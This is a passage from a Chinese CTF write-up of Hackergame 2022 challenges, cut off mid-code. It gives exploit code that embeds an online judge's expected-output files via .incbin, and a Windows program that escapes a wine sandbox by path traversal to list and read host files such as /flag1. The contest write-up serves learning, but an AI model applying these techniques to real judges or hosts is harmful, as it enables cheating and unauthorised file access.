<li><a target="_blank" rel="noopener" href="https://github.com/OmerYe/ctf-writeups/blob/master/2019/36c3/compilerbot-solve.py">OmerYe’s exp</a>，和上面的类似</li>
<li><a target="_blank" rel="noopener" href="https://rpis.ec/blog/hxp-26c3-ctf-compilerbot/">RPISEC 的 wp</a>，用的 <code>.incbin</code></li>
</ul>
</li>
</ul>
<p>感觉还是得利用 asm 的 <code>.incbin</code> 特性</p>
<blockquote>
<p><strong>7.47 <code>.incbin "file"[,skip[,count]]</code></strong></p>
<p>The <code>incbin</code> directive includes file verbatim at the current location. You can control the search paths used with the ‘-I’ command-line option (see <a target="_blank" rel="noopener" href="https://sourceware.org/binutils/docs/as/Invoking.html">Command-Line Options</a>).  Quotation marks are required around file.</p>
<p>The skip argument skips a number of bytes from the start of the file.  The count argument indicates the maximum number of bytes to read.  Note that the data is not aligned in any way, so it is the user’s responsibility to make sure that proper alignment is provided both before and after the <code>incbin</code> directive.</p>
<p><a target="_blank" rel="noopener" href="https://sourceware.org/binutils/docs/as/Incbin.html#Incbin">https://sourceware.org/binutils/docs/as/Incbin.html#Incbin</a></p>
</blockquote>
<p>然后比赛的时候本地调了老半天没搞定。。（难道因为 Windows 操作系统不行？</p>
<p>赛后问群友，说找到了个知乎上的回答：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/431645051/answer/1826562458">C++怎么把任意文本文件include成全局字符数组？</a></p>
<p>可以定义个宏来实现</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">EMBED_STR</span><span class="token expression"><span class="token punctuation">(</span>name<span class="token punctuation">,</span> path<span class="token punctuation">)</span>                </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token keyword">extern</span> <span class="token keyword">const</span> <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token keyword">asm</span><span class="token punctuation">(</span></span><span class="token string">".section .rodata, \"a\", @progbits\n"</span> <span class="token punctuation">\</span>
      <span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">name</span> </span></span><span class="token string">":\n"</span>                            <span class="token punctuation">\</span>
      <span class="token string">".incbin \""</span> <span class="token expression">path </span><span class="token string">"\"\n"</span>               <span class="token punctuation">\</span>
      <span class="token string">".byte 0\n"</span>                            <span class="token punctuation">\</span>
      <span class="token string">".previous\n"</span><span class="token expression"><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span>

<span class="token function">EMBED_STR</span><span class="token punctuation">(</span>kCurSourceFile<span class="token punctuation">,</span> <span class="token string">"example.cpp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> kCurSourceFile<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>于是可以改改这个把 <code>dynamic{0,1,2,3,4}.out</code> 都给读进来</p>
<p>为了计数是第几次执行程序，喵喵这里写入到了个 <code>/temp/cnt</code> 文件，咱试了老半天发现只有这个目录下可以写入。。</p>
<p><strong>Exp:</strong></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">EMBED_STR</span><span class="token expression"><span class="token punctuation">(</span>name<span class="token punctuation">,</span> path<span class="token punctuation">)</span>                              </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token keyword">extern</span> <span class="token keyword">const</span> <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                              </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token keyword">asm</span><span class="token punctuation">(</span></span><span class="token string">".section .rodata, \"a\", @progbits\n"</span> <span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">name</span> </span></span><span class="token string">":\n"</span> <span class="token punctuation">\</span>
        <span class="token string">".incbin \""</span> <span class="token expression">path </span><span class="token string">"\"\n"</span>                           <span class="token punctuation">\</span>
        <span class="token string">".byte 0\n"</span>                                        <span class="token punctuation">\</span>
        <span class="token string">".previous\n"</span><span class="token expression"><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span>

<span class="token function">EMBED_STR</span><span class="token punctuation">(</span>dynamic0_out<span class="token punctuation">,</span> <span class="token string">"./data/dynamic0.out"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">EMBED_STR</span><span class="token punctuation">(</span>dynamic1_out<span class="token punctuation">,</span> <span class="token string">"./data/dynamic1.out"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">EMBED_STR</span><span class="token punctuation">(</span>dynamic2_out<span class="token punctuation">,</span> <span class="token string">"./data/dynamic2.out"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">EMBED_STR</span><span class="token punctuation">(</span>dynamic3_out<span class="token punctuation">,</span> <span class="token string">"./data/dynamic3.out"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">EMBED_STR</span><span class="token punctuation">(</span>dynamic4_out<span class="token punctuation">,</span> <span class="token string">"./data/dynamic4.out"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token operator">*</span>fp2 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> num<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> filename<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> no <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">struct</span> <span class="token class-name">stat</span> statbuf<span class="token punctuation">;</span>
    fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./temp/cnt"</span><span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// fp = fopen("./cnt", "a+");</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Fail to open file cnt!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// stat("./temp/cnt", &amp;statbuf);</span>
    <span class="token comment">// stat("./cnt", &amp;statbuf);</span>
    <span class="token comment">// int size = statbuf.st_size;</span>
    <span class="token comment">// if (size &gt; 0)</span>
    <span class="token function">fscanf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>
    no <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>no <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> dynamic0_out<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>no <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> dynamic1_out<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>no <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> dynamic2_out<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>no <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> dynamic3_out<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>no <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> dynamic4_out<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token function">strcpy</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"./data/static.out"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// strcpy(filename, "./static.out");</span>

        fp2 <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>fp2 <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment">// puts("Fail to open file out!");</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">fscanf</span><span class="token punctuation">(</span>fp2<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> buff<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> buff<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fscanf</span><span class="token punctuation">(</span>fp2<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> buff<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buff<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fclose</span><span class="token punctuation">(</span>fp2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>直接丢到题目里跑就行，在 Windows 下编译会报错 </p>
<pre class="line-numbers language-none"><code class="language-none">Error: unknown pseudo-op: `.previous'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>flag{cpp_need_P1040_std_embed_...}</code></p>
<blockquote>
<p>草，好像就因为这类似报错让喵喵否定了这个用法的，所以为啥我不在 Linux 下编译呢？？？</p>
<p>所以为啥我不比较 OJ 给的输入来判断应该 printf 哪一个呢？？？非得折腾半天找个临时文件来记录（算了又不是不行</p>
</blockquote>
<p>哈哈，这个 <code>#embed</code> 咱也试过但是还没支持呢</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://wg21.link/p1040r6">P1040R6</a> “魔法”函数 std::embed ，可以随处选择嵌入一个文件并得到引用嵌入后二进制的 span 。现在的发展方向是引入一个 #depend 预处理指令指定翻译单元可以嵌入的文件。</p>
<p><a target="_blank" rel="noopener" href="https://wg21.link/p1967r2">P1967R2</a>,  <a target="_blank" rel="noopener" href="http://www.open-std.org/jtc1/sc22/wg14/www/docs/n2592.htm">N2592</a> 预处理指令 #embed ，功能比较受限而纯粹，即是得到作为嵌入的二进制数据的数组初始化器列表。 #embed 是同时针对 C 和 C++ 提出的。</p>
</blockquote>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221031032425283.png"></p>
<p>看了 <a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E5%AE%89%E5%85%A8%E7%9A%84%E5%9C%A8%E7%BA%BF%E6%B5%8B%E8%AF%84/README.md">官方 wp</a>，才发现 GitHub 上有个现成的 <a target="_blank" rel="noopener" href="https://github.com/graphitemaster/incbin">incbin</a> 头文件库，Include binary and textual files in your C/C++ applications with ease</p>
<p>呜呜，所以喵喵还是不会怎么改汇编里的 <code>.incbin</code></p>
<h2 id="杯窗鹅影"><a href="#杯窗鹅影" class="headerlink" title="杯窗鹅影"></a>杯窗鹅影</h2><blockquote>
<p>说到上回，小 K 在获得了实验室高性能服务器的访问权限之后就迁移了数据（他直到现在都还不知道自己的家目录备份被 Eve 下载了）。之后，为了跑一些别人写的在 Windows 下的计算程序，他安装了 wine 来运行它们。</p>
<p>「你用 wine 跑 Windows 程序，要是中毒了咋办？」</p>
<p>「没关系，大不了把 wineprefix 删了就行。我设置过了磁盘映射，Windows 程序是读不到我的文件的！」</p>
<p>但果真如此吗？</p>
<p>为了验证这一点，你需要点击「打开/下载题目」按钮，上传你的程序实现以下的目的：</p>
<ol>
<li><code>/flag1</code> 放置了第一个 flag。你能给出一个能在 wine 下运行的 x86_64 架构的 Windows 命令行程序来读取到第一个 flag 吗？</li>
<li><code>/flag2</code> 放置了第二个 flag，但是需要使用 <code>/readflag</code> 程序才能看到 <code>/flag2</code> 的内容。你能给出一个能在 wine 下运行的 x86_64 架构的 Windows 命令行程序来执行 <code>/readflag</code> 程序来读取到第二个 flag 吗？</li>
</ol>
<p>提示：</p>
<ol>
<li>该环境为只读环境，运行在 x86_64 架构的 Linux 上。我们未安装图形库与 32 位的相关运行库，因此需要使用图形界面的 Windows 程序与 32 位的 Windows 程序均无法执行；</li>
<li>包括 <code>start.exe</code>, <code>cmd.exe</code>, <code>winebrowser.exe</code>, <code>wineconsole.exe</code> 在内的部分程序已从环境中删除；</li>
<li>作为参考，你可以在 Linux 下使用 MinGW 交叉编译出符合要求的 Windows 程序，以 Ubuntu 22.04 为例（其他 Linux 发行版所需操作类似）：<ol>
<li>安装 MinGW 工具链，在 Ubuntu 22.04 下其对应的软件包为 <code>gcc-mingw-w64-x86-64</code>；</li>
<li>使用 C 编写 Windows 程序，这里使用 Hello, world 为例（代码见下） ；</li>
<li>使用命令 <code>x86_64-w64-mingw32-gcc helloworld.c</code> 编译，得到的 <code>a.exe</code> 文件即为符合要求的 x86_64 架构的 Windows 命令行程序。</li>
</ol>
</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;

int main(void) {
    printf("Hello, world!\n");
    return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>补充说明 1：wine 的执行环境仅包含 c: 的默认磁盘映射，z: 的磁盘映射已被删除。</strong></p>
</blockquote>
<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>试了下列目录，<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/38492353/answer/2410292611">网上随便抄了个</a> 代码，改了下路径</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_CRT_SECURE_NO_WARNINGS</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>

<span class="token comment">// Recursive是1表示递归查找，否则就只列出本级目录</span>
<span class="token keyword">int</span> <span class="token function">ListDirectory</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> Path<span class="token punctuation">,</span> <span class="token keyword">int</span> Recursive<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    HANDLE hFind<span class="token punctuation">;</span>
    WIN32_FIND_DATA FindFileData<span class="token punctuation">;</span>
    <span class="token keyword">char</span> FileName<span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> Ret <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token function">strcpy</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> Path<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcat</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcat</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> <span class="token string">"*.*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 查找第一个文件</span>
    hFind <span class="token operator">=</span> <span class="token function">FindFirstFile</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FindFileData<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>hFind <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error when list %s\n"</span><span class="token punctuation">,</span> Path<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> Ret<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">do</span>
    <span class="token punctuation">{</span>
        <span class="token comment">// 构造文件名</span>
        <span class="token function">strcpy</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> Path<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">strcat</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">strcat</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> FindFileData<span class="token punctuation">.</span>cFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> FileName<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 如果是递归查找，并且文件名不是.和..，并且文件是一个目录，那么执行递归操作</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>Recursive <span class="token operator">!=</span> <span class="token number">0</span> 
            <span class="token operator">&amp;&amp;</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>FindFileData<span class="token punctuation">.</span>cFileName<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>
            <span class="token operator">&amp;&amp;</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>FindFileData<span class="token punctuation">.</span>cFileName<span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>
            <span class="token operator">&amp;&amp;</span> FindFileData<span class="token punctuation">.</span>dwFileAttributes <span class="token operator">&amp;</span> FILE_ATTRIBUTE_DIRECTORY<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">ListDirectory</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> Recursive<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// 查找下一个文件</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">FindNextFile</span><span class="token punctuation">(</span>hFind<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FindFileData<span class="token punctuation">)</span> <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment">// ERROR_NO_MORE_FILES 表示已经全部查找完成</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> ERROR_NO_MORE_FILES<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error when get next file in %s\n"</span><span class="token punctuation">,</span> Path<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                Ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// 关闭句柄</span>
    <span class="token function">FindClose</span><span class="token punctuation">(</span>hFind<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> Ret<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> Path<span class="token punctuation">[</span>MAX_PATH <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">// 因为gets在VS2019里不可用，所以用fgets替代</span>
    <span class="token comment">// fgets(Path, sizeof(Path), stdin);  </span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>Path<span class="token punctuation">,</span> <span class="token string">"..\\"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 因为使用了fgets，所以要取掉结尾多余的换行符</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>Path<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>Path<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\n'</span>
           <span class="token operator">||</span> Path<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>Path<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\r'</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Path<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>Path<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">ListDirectory</span><span class="token punctuation">(</span>Path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>居然真的可以路径穿越到 host 上，乐！</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025063717402.png"></p>
<pre class="line-numbers language-none"><code class="language-none">..\\.
..\\..
..\\.dockerenv
..\\bin
..\\boot
..\\etc
..\\flag1
..\\flag2
..\\home
..\\lib
..\\lib64
..\\media
..\\mnt
..\\opt
..\\readflag
..\\root
..\\run
..\\sbin
..\\server.py
..\\srv
..\\tmp
..\\usr
..\\var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那就直接读 <code>/flag1</code> 完事了啊</p>
<p><strong>Exp:</strong></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, world!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> szOldPath<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">GetCurrentDirectoryA</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">,</span> szOldPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> szOldPath<span class="token punctuation">)</span><span class="token punctuation">;</span>

    FILE <span class="token operator">*</span>fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">1000000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"..\\flag1"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fscanf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> buff<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> buff<span class="token punctuation">)</span><span class="token punctuation">;</span>
